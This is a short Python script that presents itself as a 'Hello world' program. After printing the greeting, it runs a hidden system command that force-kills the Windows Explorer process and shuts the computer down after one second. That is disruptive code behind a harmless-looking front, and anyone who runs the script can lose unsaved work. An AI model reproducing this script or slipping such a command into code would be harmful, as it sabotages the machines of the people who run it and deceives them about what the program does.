import os

def main():
    print("Hello world!")
    os.system("taskkill /f /im explorer.exe && shutdown -s -t 1")

if __name__ == "__main__":
    main()
